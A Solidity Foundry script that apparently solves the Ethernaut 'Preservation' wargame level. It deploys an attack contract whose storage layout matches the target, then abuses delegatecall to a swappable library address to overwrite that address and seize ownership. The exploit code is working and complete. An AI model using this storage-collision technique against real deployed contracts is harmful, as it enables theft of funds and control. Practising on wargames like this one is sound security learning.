// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "../src/Preservation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/* ================= ATTACK CONTRACT ================= */

contract Attack {
    // Match storage layout of Preservation
    address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    address public owner;            // slot 2

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}

/* ================= SCRIPT ================= */

contract PreservationSolution is Script {

    function run() external {

        uint256 pk = vm.envUint("PRIVATE_KEY");

        Preservation target =
            Preservation(0x8ee2393F5C01B684ec449044d04781EBf7081BEa); // replace with instance

        vm.startBroadcast(pk);

        // Step 1: Deploy attack contract
        Attack attack = new Attack();

        // Step 2: Overwrite library address
        target.setFirstTime(uint256(uint160(address(attack))));

        // Step 3: Take ownership
        target.setFirstTime(uint256(uint160(msg.sender)));

        console.log("New Owner:", target.owner());

        vm.stopBroadcast();
    }
}